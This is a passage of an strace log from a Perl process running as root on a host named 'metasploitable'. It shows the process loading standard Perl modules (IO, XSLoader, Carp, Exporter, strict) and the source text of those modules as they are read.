\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12518 20:27:41.769325 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12518 20:27:41.769342 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd7000
12518 20:27:41.769353 mmap2(0xb7de0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7de0000
12518 20:27:41.769368 mmap2(0xb7de2000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7de2000
12518 20:27:41.769382 close(1)          = 0
12518 20:27:41.769406 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd6000
12518 20:27:41.769419 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dd68c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12518 20:27:41.769546 mprotect(0xb7f52000, 4096, PROT_READ) = 0
12518 20:27:41.769576 munmap(0xb7f9a000, 29913) = 0
12518 20:27:41.769590 set_tid_address(0xb7dd6908) = 12518
12518 20:27:41.769599 set_robust_list(0xb7dd6910, 0xc) = 0
12518 20:27:41.769609 futex(0xbfa2bec0, 0x81 /* FUTEX_??? */, 1) = 0
12518 20:27:41.769624 rt_sigaction(SIGRTMIN, {0xb7f5c2c0, [], SA_SIGINFO}, NULL, 8) = 0
12518 20:27:41.769637 rt_sigaction(SIGRT_1, {0xb7f5c340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12518 20:27:41.769650 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12518 20:27:41.769664 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12518 20:27:41.769684 uname({sys="Linux", node="metasploitable", ...}) = 0
12518 20:27:41.769732 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12518 20:27:41.769778 brk(0)            = 0x8153000
12518 20:27:41.769788 brk(0x8174000)    = 0x8174000
12518 20:27:41.769833 getuid32()        = 0
12518 20:27:41.769844 geteuid32()       = 0
12518 20:27:41.769853 getgid32()        = 0
12518 20:27:41.769862 getegid32()       = 0
12518 20:27:41.769900 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db5000
12518 20:27:41.769930 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12518 20:27:41.769955 read(1, ",\t\267\33", 4) = 4
12518 20:27:41.769970 close(1)          = 0
12518 20:27:41.769989 time(NULL)        = 1495672061
12518 20:27:41.770033 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfa2bb90) = -1 ENOENT (No such file or directory)
12518 20:27:41.770055 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfa2bb90) = -1 ENOENT (No such file or directory)
12518 20:27:41.770069 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfa2bb90) = -1 ENOENT (No such file or directory)
12518 20:27:41.770085 stat64("/usr/local/lib/perl/5.8.7", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770097 stat64("/usr/local/share/perl/5.8.7", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770110 stat64("/usr/local/lib/perl/5.8.6", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770122 stat64("/usr/local/share/perl/5.8.6", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770134 stat64("/usr/local/lib/perl/5.8.4", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770145 stat64("/usr/local/share/perl/5.8.4", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770157 stat64("/usr/local/lib/perl/5.8.3", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770169 stat64("/usr/local/share/perl/5.8.3", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770181 stat64("/usr/local/lib/perl/5.8.2", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770192 stat64("/usr/local/share/perl/5.8.2", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770204 stat64("/usr/local/lib/perl/5.8.1", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770216 stat64("/usr/local/share/perl/5.8.1", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770228 stat64("/usr/local/lib/perl/5.8.0", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770239 stat64("/usr/local/share/perl/5.8.0", 0xbfa2bcd0) = -1 ENOENT (No such file or directory)
12518 20:27:41.770262 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b9c8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.770276 _llseek(0, 0, [0], SEEK_CUR) = 0
12518 20:27:41.770288 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b9c8) = -1 EBADF (Bad file descriptor)
12518 20:27:41.770298 _llseek(1, 0, 0xbfa2ba10, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12518 20:27:41.770309 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b9c8) = -1 EINVAL (Invalid argument)
12518 20:27:41.770320 _llseek(2, 0, 0xbfa2ba10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12518 20:27:41.770331 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12518 20:27:41.770344 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ba88) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.770354 _llseek(1, 0, [0], SEEK_CUR) = 0
12518 20:27:41.770365 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12518 20:27:41.770377 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12518 20:27:41.770396 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12518 20:27:41.770467 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12518 20:27:41.770515 getppid()         = 12516
12518 20:27:41.770578 stat64("/etc/perl/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770600 stat64("/etc/perl/IO.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770614 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770627 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770641 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770653 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770667 stat64("/usr/lib/perl5/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770680 stat64("/usr/lib/perl5/IO.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770693 stat64("/usr/share/perl5/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770706 stat64("/usr/share/perl5/IO.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770719 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.770739 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12518 20:27:41.770761 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.770775 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.770787 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.770812 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12518 20:27:41.770869 stat64("/etc/perl/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770883 stat64("/etc/perl/XSLoader.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770897 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770910 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770924 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770937 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770962 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770974 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.770988 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771000 stat64("/usr/share/perl5/XSLoader.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771014 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771027 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12518 20:27:41.771048 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.771062 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.771073 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.771093 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12518 20:27:41.771332 brk(0x8195000)    = 0x8195000
12518 20:27:41.771659 _llseek(8, 3407, [3407], SEEK_SET) = 0
12518 20:27:41.771677 _llseek(8, 0, [3407], SEEK_CUR) = 0
12518 20:27:41.771688 close(8)          = 0
12518 20:27:41.771735 stat64("/etc/perl/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771750 stat64("/etc/perl/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771764 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771777 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771791 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771804 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771818 stat64("/usr/lib/perl5/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771830 stat64("/usr/lib/perl5/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771844 stat64("/usr/share/perl5/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771856 stat64("/usr/share/perl5/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771869 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771882 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771896 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.771909 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12518 20:27:41.771931 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.771956 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.771972 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.771990 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12518 20:27:41.772423 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12518 20:27:41.772461 read(8, "", 4096) = 0
12518 20:27:41.772473 close(8)          = 0
12518 20:27:41.772495 stat64("/etc/perl/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772509 stat64("/etc/perl/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772523 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772537 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772551 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772564 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772578 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772591 stat64("/usr/lib/perl5/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772604 stat64("/usr/share/perl5/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772617 stat64("/usr/share/perl5/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772630 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772643 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772657 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.772670 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12518 20:27:41.772692 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.772706 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.772718 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.772735 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12518 20:27:41.772935 _llseek(8, 2217, [2217], SEEK_SET) = 0
12518 20:27:41.772953 _llseek(8, 0, [2217], SEEK_CUR) = 0
12518 20:27:41.772964 close(8)          = 0
12518 20:27:41.773040 stat64("/etc/perl/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773056 stat64("/etc/perl/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773070 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773084 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773098 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773111 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773125 stat64("/usr/lib/perl5/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773137 stat64("/usr/lib/perl5/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773151 stat64("/usr/share/perl5/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773175 stat64("/usr/share/perl5/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773215 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773246 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773260 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773273 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12518 20:27:41.773294 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.773309 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.773321 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.773340 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12518 20:27:41.773482 _llseek(8, 598, [598], SEEK_SET) = 0
12518 20:27:41.773497 _llseek(8, 0, [598], SEEK_CUR) = 0
12518 20:27:41.773507 close(8)          = 0
12518 20:27:41.773545 stat64("/etc/perl/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773561 stat64("/etc/perl/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
